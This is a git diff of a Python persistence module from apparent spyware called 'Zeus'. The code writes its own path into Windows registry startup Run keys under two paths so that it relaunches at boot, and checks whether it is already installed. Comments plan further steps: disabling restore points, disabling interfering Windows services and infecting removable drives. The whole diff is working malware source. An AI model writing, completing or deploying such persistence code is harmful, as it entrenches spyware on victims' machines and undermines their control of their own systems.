@@ -28,7 +28,7 @@ class BootPersistanceHandler:
             self.implantToRegistry()
 
             # 2. Copy file manually
-            self.copyFilesManually()
+            # self.copyFilesManually()
 
             # 3. Disable restore points
             # 4. Disable windows services which can interfer propy injection to device
@@ -36,22 +36,21 @@ class BootPersistanceHandler:
             # infect them as well (make spyware startup from removable device)
 
     def implantToRegistry(self):
+        self.addSelfToRegistryPath(self.WINDOWS_REGISTRY_START_UP_PATH)
+        self.addSelfToRegistryPath(self.WINDOWS_ALTERNATIVE_REGISTRY_START_UP_PATH)
+
+    def addSelfToRegistryPath(self, regPath):
         try:
             isKeyExistsInRegistry = False
-            registryKey = self.checkRegistryKey(self.WINDOWS_REGISTRY_START_UP_PATH, "Zeus", os.path.abspath(__file__))
-            if registryKey:
-                keyCheck = registryKey[0]
+            isKeyExistsInRegistry = self.checkRegistryKey(regPath, "Zeus", os.path.abspath(__file__))
+            if isKeyExistsInRegistry:
+                print(r"Zeus already installed in: %s!" % regPath)
+            else:
+                print(r"Implanting Zeus to windows registry to: %s" % regPath)
 
-                if keyCheck == 1:
-                    isKeyExistsInRegistry = True
-                    print("Zeus already installed!")
-
-            if not isKeyExistsInRegistry:
-                print("Implanting Zeus to windows registry")
-
-            didSaveKeySuccessfully = self.setRegistryValue("Zeus", os.path.abspath(__file__))
-            if not didSaveKeySuccessfully:
-                print("Error adding Zeus to windows registry run key.")
+                didSaveKeySuccessfully = self.setRegistryValue("Zeus", os.path.abspath(__file__))
+                if not didSaveKeySuccessfully:
+                    print("Error adding Zeus to windows registry run key.")
         except EnvironmentError:
             print(EnvironmentError)
 
@@ -69,22 +68,18 @@ class BootPersistanceHandler:
 
     def checkRegistryKey(self, regPath, key, value):
         registryConnect = ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
-        localtz = winreg.OpenKey(registryConnect,  self.WINDOWS_REGISTRY_START_UP_PATH)
-        keyvalues = self.valuestodict(localtz)
-        localtz.Close()
-        print("print list->")
-        print(keyvalues)
-
-
+        zeusKey = winreg.OpenKey(registryConnect,  regPath)
+        keyvalues = self.valuesToDict(zeusKey)
+        zeusKey.Close()
 
         if "Zeus" in keyvalues:
-            tzkeyname = keyvalues['Zeus']
-            print("tzkeyname: %s" % tzkeyname)
+            zeusPath = keyvalues['Zeus']
+            if zeusPath == os.path.abspath(__file__):
+                return True
 
-            exit(0)
-            return True
+        return  False
 
-    def valuestodict(self, key):
+    def valuesToDict(self, key):
         """Convert a registry key's values to a dictionary."""
         dict = {}
         size = winreg.QueryInfoKey(key)[1]
